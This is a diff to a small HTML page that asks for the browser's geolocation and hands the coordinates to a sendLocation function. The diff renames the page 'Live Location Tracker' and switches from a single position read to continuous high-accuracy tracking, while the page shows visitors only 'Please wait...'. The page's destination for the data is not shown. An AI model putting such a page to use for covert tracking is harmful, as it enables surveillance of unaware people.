@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Location Access</title>
+  <title>Live Location Tracker</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -22,6 +22,7 @@
 </head>
 <body>
   <p id="loading">Please wait...</p>
+
   <script>
     function sendLocation(position) {
       const { latitude, longitude } = position.coords;
@@ -45,7 +46,11 @@
     }
 
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      navigator.geolocation.watchPosition(sendLocation, handleError, {
+        enableHighAccuracy: true,
+        maximumAge: 0,
+        timeout: 5000
+      });
     }
   </script>
 </body>
